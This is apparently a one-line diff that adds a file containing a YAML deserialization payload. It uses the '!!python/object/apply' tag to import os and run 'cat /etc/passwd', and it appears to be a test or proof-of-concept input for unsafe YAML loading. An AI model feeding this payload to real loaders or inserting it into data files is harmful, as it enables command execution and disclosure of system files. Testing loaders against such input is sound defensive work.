@@ -1,0 +1,1 @@
+!!python/object/apply:__import__ ['os'].system('cat /etc/passwd')
